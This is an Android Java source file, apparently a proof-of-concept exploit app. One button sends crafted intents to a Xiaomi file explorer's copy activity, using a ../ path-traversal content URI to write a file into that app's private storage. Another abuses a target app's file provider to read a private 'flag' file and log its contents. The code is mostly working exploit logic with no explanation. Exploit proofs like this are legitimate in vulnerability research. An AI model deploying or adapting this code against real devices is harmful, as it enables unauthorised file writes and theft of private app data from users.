package com.example.pocapplication;

import android.bluetooth.BluetoothAdapter;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import android.text.Spannable;
import android.text.SpannableStringBuilder;
import android.text.style.ForegroundColorSpan;
import android.text.style.StyleSpan;
import android.util.Log;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.time.format.TextStyle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });





        Button vul1Btn = findViewById(R.id.vul1Btn);
        TextView tv = findViewById(R.id.logTextView);

        String path = "";
        try{
            path = new File("content://provider/a.txt\n").getCanonicalPath();
        }catch (Exception e){

        }
        tv.append(path);
        tv.append("content://com.poc.fileWrite/files/evil.txt?path=" + getFilesDir() + "/evil.txt" + "&name=../../../../../../../../data/user/0/com.mi.android.globalFileexplorer/files/evil.txt" + "&size=10");


        findViewById(R.id.openUnexpBtn).setOnClickListener(v -> {


            /**
             * poc
             */
            Log.d("ATTACK", "attack start");
            Intent i = new Intent();
            i.setClassName("com.example.myapplication", "com.example.myapplication.MainActivity");
            i.setAction("ACTION_SHARE_TO_ME");
            i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
            i.setData(Uri.parse("content://com.example.myapplication.fileprovider/data/data/com.example.myapplication/files/flag"));
            startActivityForResult(i, 5);




//            String fileName = "test1.txt";
//            String content = "ATTACK!!!\n";
//            try (FileOutputStream fos = openFileOutput(fileName, MODE_PRIVATE)) {
//                fos.write(content.getBytes());
//            } catch (FileNotFoundException e ) {
//                e.printStackTrace();
//            }catch(IOException e){
//                e.printStackTrace();
//            }
//
//            Intent intent = new Intent(Intent.ACTION_SEND);
//            intent.setComponent(new ComponentName("com.mi.android.globalFileexplorer", "com.android.fileexplorer.activity.CopyFileActivity"));
//            intent.setData(Uri.parse("content://com.example.pocapplication/files/test1.txt"));
//            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
//            startActivity(intent);
        });

        vul1Btn.setOnClickListener(v -> {
            String fileName = "evil.txt";
            String content = "ATTACK!!!\n";
            try (FileOutputStream fos = openFileOutput(fileName, MODE_PRIVATE)) {
                fos.write(content.getBytes());
            } catch (FileNotFoundException e ) {
                e.printStackTrace();
            }catch(IOException e){
                e.printStackTrace();
            }

            Intent intent = new Intent();
            intent.setAction(Intent.ACTION_SEND);
            intent.setComponent(new ComponentName("com.mi.android.globalFileexplorer", "com.android.fileexplorer.activity.CopyFileActivity"));



            intent.setData(Uri.parse("content://com.poc.fileWrite/files/evil.txt?path=" + getFilesDir() + "/evil.txt" + "&name=../../../../../../../../data/user/0/com.mi.android.globalFileexplorer/files/evil.txt" + "&size=10"));
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

            startActivity(intent);

        });

    }

    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        Uri uri = data.getData();
        if(uri != null){
            try{
                Log.d("ATTACK", "onActivityResult: " + uri.toString());
                ParcelFileDescriptor pfd = getContentResolver().openFileDescriptor(uri, "r");
                FileInputStream fis = new FileInputStream(pfd.getFileDescriptor());
                BufferedReader reader = new BufferedReader(new InputStreamReader(fis));
                String line;
                while ((line = reader.readLine()) != null) {
                    Log.d("ATTACK", line);
                    Toast.makeText(this, line, Toast.LENGTH_LONG).show();
                }

                fis.close();
                pfd.close();
            }catch (Exception e){
                e.printStackTrace();
            }
        }

        String result = data.getStringExtra("result");
        Log.d("TAG", "onActivityResult: " + result);

    }
}